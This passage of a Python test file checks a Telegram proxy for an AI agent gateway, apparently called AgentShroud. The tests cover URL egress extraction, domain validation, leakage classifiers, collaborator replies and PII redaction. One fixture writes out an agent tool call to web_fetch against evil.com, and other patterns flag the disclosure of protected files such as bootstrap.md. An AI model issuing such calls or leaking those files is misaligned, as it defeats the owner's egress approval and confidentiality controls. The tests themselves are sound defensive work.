        assert target is None

    def test_extract_first_egress_target_prefers_first_http_url(self):
        text = "check https://example.com/path then https://weather.com/today"
        target = TelegramAPIProxy._extract_first_egress_target(text)
        assert target == "https://example.com/path"

    def test_extract_first_egress_target_handles_bare_domain_with_query(self):
        text = "please open weather.com/today?unit=f and summarize"
        target = TelegramAPIProxy._extract_first_egress_target(text)
        assert target == "https://weather.com/today?unit=f"

    def test_extract_first_egress_target_strips_markdown_wrapper_punctuation(self):
        text = "fetch [weather](https://weather.com/weather/today/l/Pittsburgh,PA)."
        target = TelegramAPIProxy._extract_first_egress_target(text)
        assert target == "https://weather.com/weather/today/l/Pittsburgh,PA"

    def test_extract_first_egress_target_skips_protocol_relative_host_without_tld(self):
        text = "open //localhost/path and report"
        target = TelegramAPIProxy._extract_first_egress_target(text)
        assert target is None

    def test_extract_first_egress_target_rejects_ip_literal_bare_target(self):
        text = "visit 127.0.0.1/admin for diagnostics"
        target = TelegramAPIProxy._extract_first_egress_target(text)
        assert target is None

    def test_extract_first_egress_target_accepts_uppercase_http_scheme(self):
        text = "Fetch HTTP://WEATHER.COM/TODAY now"
        target = TelegramAPIProxy._extract_first_egress_target(text)
        assert target == "HTTP://WEATHER.COM/TODAY"

    def test_extract_first_egress_target_trims_wrapping_quotes(self):
        text = "use 'https://weather.com/weather/today/l/Pittsburgh,PA'."
        target = TelegramAPIProxy._extract_first_egress_target(text)
        assert target == "https://weather.com/weather/today/l/Pittsburgh,PA"

    def test_extract_first_egress_target_supports_protocol_relative_with_query(self):
        text = "open //weather.com/today?unit=f&lang=en!"
        target = TelegramAPIProxy._extract_first_egress_target(text)
        assert target == "https://weather.com/today?unit=f&lang=en"

    def test_extract_first_egress_target_supports_parenthesized_bare_domain(self):
        text = "please check (weather.com/today) before the call"
        target = TelegramAPIProxy._extract_first_egress_target(text)
        assert target == "https://weather.com/today"

    def test_extract_first_egress_target_returns_none_when_no_url_or_domain(self):
        text = "just summarize the current status without browsing"
        target = TelegramAPIProxy._extract_first_egress_target(text)
        assert target is None

    def test_extract_first_egress_target_ignores_markdown_filename_token(self):
        text = "show BOOTSTRAP.md from workspace"
        target = TelegramAPIProxy._extract_first_egress_target(text)
        assert target is None

    def test_extract_first_egress_target_ignores_text_filename_token(self):
        text = "create test.txt with sample content"
        target = TelegramAPIProxy._extract_first_egress_target(text)
        assert target is None

    def test_extract_first_egress_target_handles_empty_inputs(self):
        assert TelegramAPIProxy._extract_first_egress_target("") is None
        assert TelegramAPIProxy._extract_first_egress_target(None) is None

    def test_extract_first_egress_target_ignores_version_like_tokens(self):
        text = "use release v1.2.3 and continue without browsing"
        target = TelegramAPIProxy._extract_first_egress_target(text)
        assert target is None

    def test_extract_first_egress_target_skips_email_then_finds_http_url(self):
        text = "contact steve@weather.com then open https://weather.com/today"
        target = TelegramAPIProxy._extract_first_egress_target(text)
        assert target == "https://weather.com/today"


class TestDomainValidationHelper:
    """Unit tests for domain validator used by egress approval flow."""

    def test_is_valid_domain_name_accepts_standard_host(self):
        assert TelegramAPIProxy._is_valid_domain_name("weather.com") is True
        assert TelegramAPIProxy._is_valid_domain_name("sub.api.weather.com") is True

    def test_is_valid_domain_name_rejects_malformed_hosts(self):
        assert TelegramAPIProxy._is_valid_domain_name("localhost") is False
        assert TelegramAPIProxy._is_valid_domain_name("bad..domain.com") is False
        assert TelegramAPIProxy._is_valid_domain_name("-bad.com") is False
        assert TelegramAPIProxy._is_valid_domain_name("bad-.com") is False

    def test_is_valid_domain_name_rejects_punycode_and_non_ascii_labels(self):
        assert TelegramAPIProxy._is_valid_domain_name("xn--example.com") is False
        assert TelegramAPIProxy._is_valid_domain_name("météo.com") is False

    def test_is_valid_domain_name_enforces_tld_rules(self):
        assert TelegramAPIProxy._is_valid_domain_name("example.c") is False
        assert TelegramAPIProxy._is_valid_domain_name("example.123") is False

    def test_is_valid_domain_name_rejects_overlong_domain(self):
        label = "a" * 63
        overlong = ".".join([label, label, label, label, "com"])
        assert len(overlong) > 253
        assert TelegramAPIProxy._is_valid_domain_name(overlong) is False

    def test_is_valid_domain_name_rejects_overlong_label(self):
        bad_label = "a" * 64
        assert TelegramAPIProxy._is_valid_domain_name(f"{bad_label}.com") is False

    def test_is_valid_domain_name_rejects_underscore_label(self):
        assert TelegramAPIProxy._is_valid_domain_name("bad_name.example.com") is False

    def test_is_valid_domain_name_accepts_numeric_inner_labels(self):
        assert TelegramAPIProxy._is_valid_domain_name("api2.v1.weather.com") is True

    def test_is_valid_domain_name_rejects_leading_or_trailing_dot(self):
        assert TelegramAPIProxy._is_valid_domain_name(".weather.com") is False
        assert TelegramAPIProxy._is_valid_domain_name("weather.com.") is False

    def test_is_valid_domain_name_accepts_uppercase_input_via_normalization(self):
        assert TelegramAPIProxy._is_valid_domain_name("WEATHER.COM") is True

    def test_is_valid_domain_name_rejects_empty_or_whitespace(self):
        assert TelegramAPIProxy._is_valid_domain_name("") is False
        assert TelegramAPIProxy._is_valid_domain_name("   ") is False

    def test_is_valid_domain_name_strips_surrounding_whitespace(self):
        assert TelegramAPIProxy._is_valid_domain_name("  weather.com  ") is True

    def test_is_valid_domain_name_handles_none_input(self):
        assert TelegramAPIProxy._is_valid_domain_name(None) is False

    def test_is_valid_domain_name_accepts_mixed_case_domain(self):
        assert TelegramAPIProxy._is_valid_domain_name("WeAtHeR.CoM") is True

    def test_is_valid_domain_name_rejects_whitespace_inside_label(self):
        assert TelegramAPIProxy._is_valid_domain_name("weather .com") is False

    def test_is_valid_domain_name_accepts_hyphenated_inner_label(self):
        assert TelegramAPIProxy._is_valid_domain_name("api-gw.weather.com") is True

    def test_is_valid_domain_name_rejects_single_label_host(self):
        assert TelegramAPIProxy._is_valid_domain_name("weather") is False


class TestOutboundTextFieldResolution:
    """Unit tests for outbound text field resolution helper behavior."""

    def test_resolve_text_field_prefers_first_non_empty_field(self):
        data = {
            "text": "   ",
            "message": "",
            "caption": "real payload",
        }
        key, value = TelegramAPIProxy._resolve_text_field(data)
        assert key == "caption"
        assert value == "real payload"

    def test_resolve_text_field_falls_back_to_first_string_when_all_empty(self):
        data = {
            "text": " ",
            "message": "",
            "caption": "   ",
        }
        key, value = TelegramAPIProxy._resolve_text_field(data)
        assert key == "text"
        assert value == " "


class TestOutboundClassifierHelpers:
    """Unit tests for outbound helper classifiers used by collaborator filtering."""

    def test_contains_internal_approval_banner_detects_standard_banner(self):
        text = "🌐 Egress Request\nDomain: weather.com:443\nRisk: Yellow\nTool: web_fetch\nID: 123"
        assert TelegramAPIProxy._contains_internal_approval_banner(text) is True

    def test_contains_internal_approval_banner_ignores_normal_text(self):
        assert TelegramAPIProxy._contains_internal_approval_banner("normal status update") is False

    def test_contains_legacy_block_notice_detects_legacy_bracket_text(self):
        text = "[AgentShroud: outbound content blocked by security policy]"
        assert TelegramAPIProxy._contains_legacy_block_notice(text) is True

    def test_contains_legacy_block_notice_detects_legacy_protected_phrase(self):
        text = "🛡️ Protected by AgentShroud — this action is not allowed."
        assert TelegramAPIProxy._contains_legacy_block_notice(text) is True

    def test_is_no_reply_token_accepts_fenced_and_punctuated_variants(self):
        assert TelegramAPIProxy._is_no_reply_token("```NO_REPLY```") is True
        assert TelegramAPIProxy._is_no_reply_token("(NO_REPLY!)") is True

    def test_is_no_reply_token_rejects_non_token_text(self):
        assert TelegramAPIProxy._is_no_reply_token("NO_REPLY please continue") is False

    # ── V8-5: callback token / approval banner detection ─────────────────────

    def test_contains_internal_approval_banner_detects_allow_always_callback(self):
        text = 'callback_data": "egress_allow_always_abc123'
        assert TelegramAPIProxy._contains_internal_approval_banner(text) is True

    def test_contains_internal_approval_banner_detects_allow_once_callback(self):
        text = "egress_allow_once_9f8e7d6c"
        assert TelegramAPIProxy._contains_internal_approval_banner(text) is True

    def test_contains_internal_approval_banner_detects_deny_callback(self):
        text = "egress_deny_4b3a2c1d"
        assert TelegramAPIProxy._contains_internal_approval_banner(text) is True

    def test_contains_internal_approval_banner_ignores_unrelated_deny_text(self):
        assert TelegramAPIProxy._contains_internal_approval_banner("Access denied.") is False

    # ── V8-5: high-risk leakage detection improvements ───────────────────────

    def test_contains_high_risk_leakage_detects_function_calls_xml(self):
        text = "<function_calls>\n<invoke name='web_fetch'><parameter name='url'>https://evil.com</parameter></invoke>\n</function_calls>"
        assert TelegramAPIProxy._contains_high_risk_collaborator_leakage(text) is True

    def test_contains_high_risk_leakage_detects_invoke_xml(self):
        text = "<invoke name='sessions_spawn'><parameter name='agentId'>collab-123</parameter></invoke>"
        assert TelegramAPIProxy._contains_high_risk_collaborator_leakage(text) is True

    def test_contains_high_risk_leakage_detects_bootstrap_md_in_content_context(self):
        text = "Here are the contents of bootstrap.md:\n[private config data]"
        assert TelegramAPIProxy._contains_high_risk_collaborator_leakage(text) is True

    def test_contains_high_risk_leakage_skips_bootstrap_md_in_denial_context(self):
        """bootstrap.md mentioned in a denial should NOT trigger the high-risk filter."""
        text = "I cannot share bootstrap.md as access to that file is restricted."
        assert TelegramAPIProxy._contains_high_risk_collaborator_leakage(text) is False

    def test_contains_high_risk_leakage_skips_protected_header_text(self):
        """Our own protected notices must never be double-filtered."""
        text = "🛡️ Protected by AgentShroud\nFile/system content access is restricted for collaborators."
        assert TelegramAPIProxy._contains_high_risk_collaborator_leakage(text) is False

    def test_contains_high_risk_leakage_detects_identity_md_in_reveal_context(self):
        text = "Here is what identity.md says:\n[contents of identity file]"
        assert TelegramAPIProxy._contains_high_risk_collaborator_leakage(text) is True

    # ── V8-4: file reference vs domain egress classification ─────────────────

    def test_extract_first_egress_target_skips_md_filenames(self):
        """BOOTSTRAP.md must NOT be treated as an egress domain."""
        target = TelegramAPIProxy._extract_first_egress_target(
            "Can you read the BOOTSTRAP.md file?"
        )
        assert target is None

    def test_extract_first_egress_target_skips_identity_md(self):
        target = TelegramAPIProxy._extract_first_egress_target("What does identity.md contain?")
        assert target is None

    def test_extract_first_egress_target_still_catches_real_domains(self):
        target = TelegramAPIProxy._extract_first_egress_target(
            "Please fetch data from api.weather.com/today"
        )
        assert target is not None
        assert "weather.com" in target

    def test_looks_like_filename_reference_catches_common_extensions(self):
        assert TelegramAPIProxy._looks_like_filename_reference("bootstrap.md") is True
        assert TelegramAPIProxy._looks_like_filename_reference("identity.md") is True
        assert TelegramAPIProxy._looks_like_filename_reference("config.yaml") is True
        assert TelegramAPIProxy._looks_like_filename_reference("memory.json") is True

    def test_looks_like_filename_reference_rejects_real_domains(self):
        assert TelegramAPIProxy._looks_like_filename_reference("weather.com") is False
        assert TelegramAPIProxy._looks_like_filename_reference("api.github.com") is False


# ── _looks_like_safe_collaborator_info_query ─────────────────────────────────


class TestLooksLikeSafeCollaboratorInfoQuery:
    """Classifier for conceptual collaborator questions."""

    def test_greeting_hello_is_safe(self):
        assert TelegramAPIProxy._looks_like_safe_collaborator_info_query("Hello") is True

    def test_greeting_hi_is_safe(self):
        assert TelegramAPIProxy._looks_like_safe_collaborator_info_query("hi there") is True

    def test_greeting_hey_is_safe(self):
        assert TelegramAPIProxy._looks_like_safe_collaborator_info_query("Hey!") is True

    def test_greeting_good_morning_is_safe(self):
        assert TelegramAPIProxy._looks_like_safe_collaborator_info_query("Good morning") is True

    def test_greeting_bypasses_interrogative_requirement(self):
        # "Hello" has no '?', 'how', 'what', etc. — should still return True
        assert TelegramAPIProxy._looks_like_safe_collaborator_info_query("Hello!") is True

    def test_security_model_question(self):
        assert (
            TelegramAPIProxy._looks_like_safe_collaborator_info_query(
                "What is the security model here?"
            )
            is True
        )

    def test_protection_question(self):
        assert (
            TelegramAPIProxy._looks_like_safe_collaborator_info_query("How does protection work?")
            is True
        )

    def test_refuse_question(self):
        assert (
            TelegramAPIProxy._looks_like_safe_collaborator_info_query(
                "What requests do you refuse?"
            )
            is True
        )

    def test_restrict_question(self):
        assert (
            TelegramAPIProxy._looks_like_safe_collaborator_info_query(
                "What is restricted for collaborators?"
            )
            is True
        )

    def test_pii_question(self):
        assert (
            TelegramAPIProxy._looks_like_safe_collaborator_info_query(
                "What happens to pii in my messages?"
            )
            is True
        )

    def test_sanitiz_question(self):
        assert (
            TelegramAPIProxy._looks_like_safe_collaborator_info_query("How does sanitization work?")
            is True
        )

    def test_formatting_trick_question(self):
        assert (
            TelegramAPIProxy._looks_like_safe_collaborator_info_query(
                "Can a formatting trick bypass the policy?"
            )
            is True
        )

    def test_what_can_you_question(self):
        assert (
            TelegramAPIProxy._looks_like_safe_collaborator_info_query("What can you help with?")
            is True
        )

    def test_collaboration_question(self):
        assert (
            TelegramAPIProxy._looks_like_safe_collaborator_info_query(
                "How does collaboration work here?"
            )
            is True
        )

    def test_password_question(self):
        assert (
            TelegramAPIProxy._looks_like_safe_collaborator_info_query("How are passwords handled?")
            is True
        )

    def test_no_match_without_tokens(self):
        assert (
            TelegramAPIProxy._looks_like_safe_collaborator_info_query("Tell me something random")
            is False
        )

    def test_file_query_is_blocked(self):
        assert (
            TelegramAPIProxy._looks_like_safe_collaborator_info_query("What is in config.yaml?")
            is False
        )

    def test_execute_verb_is_blocked(self):
        assert (
            TelegramAPIProxy._looks_like_safe_collaborator_info_query("How do I execute a command?")
            is False
        )


# ── _build_collaborator_safe_info_response ────────────────────────────────────


class TestBuildCollaboratorSafeInfoResponse:
    """Static response builder for collaborator conceptual queries."""

    def _resp(self, prompt: str) -> str:
        return TelegramAPIProxy._build_collaborator_safe_info_response(prompt)

    def test_greeting_hello(self):
        r = self._resp("Hello")
        assert "collaborator mode" in r.lower()
        assert "AgentShroud" in r

    def test_greeting_hi(self):
        r = self._resp("hi")
        assert "collaborator mode" in r.lower()

    def test_greeting_good_morning(self):
        r = self._resp("Good morning")
        assert "collaborator mode" in r.lower()

    def test_greeting_contains_capability_hint(self):
        r = self._resp("Hello")
        assert (
            "security" in r.lower() or "architecture" in r.lower() or "authorization" in r.lower()
        )

    def test_restriction_refuse(self):
        r = self._resp("What do you refuse to do?")
        assert "collaborator" in r.lower()
        assert "restricted" in r.lower() or "owner" in r.lower()

    def test_restriction_not_allowed(self):
        r = self._resp("What is not allowed in collaborator mode?")
        assert "restricted" in r.lower() or "owner" in r.lower()

    def test_pii_sanitization(self):
        r = self._resp("What happens to pii in my message?")
        assert "sanitiz" in r.lower() or "redact" in r.lower() or "privacy" in r.lower()

    def test_credit_card_privacy(self):
        r = self._resp("What if I send a credit card number?")
        assert "sanitiz" in r.lower() or "proxy" in r.lower() or "privacy" in r.lower()

    def test_input_consistency_formatting_trick(self):
        r = self._resp("Can a formatting trick bypass sanitization?")
        assert "normaliz" in r.lower() or "policy" in r.lower()

    def test_input_consistency_spaces_or_dashes(self):
        r = self._resp("What about spaces or dashes in inputs?")
        assert "normaliz" in r.lower() or "policy" in r.lower()

    def test_security_model(self):
        r = self._resp("What is the security model?")
        assert "policy" in r.lower() or "security" in r.lower()

    def test_security_approach(self):
        r = self._resp("How does the security approach work?")
        assert "policy" in r.lower() or "security" in r.lower()

    def test_password_credential_branch(self):
        r = self._resp("How are passwords stored?")
        assert "credential" in r.lower() or "secret" in r.lower() or "authorization" in r.lower()

    def test_what_can_you_capability(self):
        r = self._resp("What can you help with?")
        assert "collaborator" in r.lower() or "capability" in r.lower() or "authorized" in r.lower()

    def test_collaboration_capability(self):
        r = self._resp("How does collaboration work with this system?")
        assert "collaborator" in r.lower() or "capability" in r.lower() or "authorized" in r.lower()

    def test_architecture_existing_branch(self):
        r = self._resp("Can you explain the architecture?")
        assert "policy" in r.lower() or "security" in r.lower()

    def test_fallback_for_unmatched(self):
        r = self._resp("something completely unrelated")
        assert "collaborator" in r.lower()


class TestParseModeStrippedAfterPIIRedaction:
    """Regression tests for Telegram HTML parse error caused by PII placeholders.

    When the PII sanitizer replaces e.g. an email with <EMAIL_ADDRESS>, and
    parse_mode=HTML is set, Telegram rejects the message with:
      "can't parse entities: Unsupported start tag 'email_address'"

    The bug manifests for OWNER chats: collaborators always have HTML stripped
    at the collaborator-markup step. For the owner, HTML is preserved until the
    PII sanitizer runs — and if the sanitizer injects <EMAIL_ADDRESS>, parse_mode
    must be stripped AFTER sanitization.

    Regression for: sendMessage failed — Unsupported start tag "email_address"
    """

    _OWNER_ID = "8096968754"

    def _make_owner_proxy(self, **kwargs):
        """Return a TelegramAPIProxy configured with a mock owner RBAC."""

        class _MockRBAC:
            owner_user_id = TestParseModeStrippedAfterPIIRedaction._OWNER_ID

        proxy = TelegramAPIProxy(**kwargs)
        proxy._rbac = _MockRBAC()
        return proxy

    @pytest.mark.asyncio
    async def test_parse_mode_stripped_when_email_redacted_fallback_path(self):
        """parse_mode must be removed when sanitizer injects <EMAIL_ADDRESS> (owner, fallback path).

        For owner chats the collaborator-HTML strip is skipped, so the PII sanitizer
        runs with parse_mode=HTML still active. After redaction, <EMAIL_ADDRESS> in
        the text must cause parse_mode to be removed before the response is forwarded.
        """
        sanitizer = _make_sanitizer()
        proxy = self._make_owner_proxy(sanitizer=sanitizer)

        body = json.dumps(
            {
                "chat_id": self._OWNER_ID,
                "text": "Contact me at user@example.com for details.",
                "parse_mode": "HTML",
            }
        ).encode()

        result = await proxy._filter_outbound(body, "application/json")
        result_data = json.loads(result)

        assert "user@example.com" not in result_data["text"], "Email should be redacted"
        assert result_data.get("parse_mode", "") != "HTML", (
            "parse_mode=HTML must be stripped when PII placeholders like "
            "<EMAIL_ADDRESS> are present — Telegram rejects these as invalid tags"
        )

    @pytest.mark.asyncio
    async def test_parse_mode_stripped_when_phone_redacted_fallback_path(self):
        """parse_mode must be removed when sanitizer injects <PHONE_NUMBER> (owner, fallback path)."""
        sanitizer = _make_sanitizer()
        proxy = self._make_owner_proxy(sanitizer=sanitizer)

        body = json.dumps(
            {
                "chat_id": self._OWNER_ID,
                "text": "Call 555-867-5309 to schedule.",
                "parse_mode": "HTML",
            }
        ).encode()

        result = await proxy._filter_outbound(body, "application/json")
        result_data = json.loads(result)

        assert "555-867-5309" not in result_data["text"], "Phone should be redacted"
        assert result_data.get("parse_mode", "") != "HTML", (
            "parse_mode=HTML must be stripped when PII placeholders are present"
        )

    @pytest.mark.asyncio
    async def test_parse_mode_preserved_when_no_pii_detected(self):
        """parse_mode=HTML must be preserved for owner when text contains no PII."""
        sanitizer = _make_sanitizer()
        proxy = self._make_owner_proxy(sanitizer=sanitizer)

        body = json.dumps(
            {
                "chat_id": self._OWNER_ID,
                "text": "<b>Hello world</b>, no PII here.",
                "parse_mode": "HTML",
            }
        ).encode()

        result = await proxy._filter_outbound(body, "application/json")
        result_data = json.loads(result)

        # parse_mode should be preserved for owner when no PII is present
        assert result_data.get("parse_mode") == "HTML", (
            "parse_mode=HTML must be preserved when the text contains no PII"
        )

    @pytest.mark.asyncio
    async def test_parse_mode_stripped_when_pipeline_sanitizes_email(self):
        """parse_mode must be removed when pipeline produces <EMAIL_ADDRESS> (owner, pipeline path)."""
        from types import SimpleNamespace

        class PIIPipeline:
            async def process_outbound(self, response, **kwargs):
                sanitized = response.replace("user@example.com", "<EMAIL_ADDRESS>")
                return SimpleNamespace(
                    blocked=False,
                    sanitized_message=sanitized,
                    block_reason="",
                    info_filter_redaction_count=0,
                )

        sanitizer = _make_sanitizer()
        proxy = self._make_owner_proxy(pipeline=PIIPipeline(), sanitizer=sanitizer)

        body = json.dumps(
            {
                "chat_id": self._OWNER_ID,
                "text": "Send to user@example.com please.",
                "parse_mode": "HTML",
            }
        ).encode()

        result = await proxy._filter_outbound(body, "application/json")
        result_data = json.loads(result)

        assert "user@example.com" not in result_data["text"], "Email should be redacted"
        assert result_data.get("parse_mode", "") != "HTML", (
            "parse_mode=HTML must be stripped when pipeline produces PII placeholders"
        )
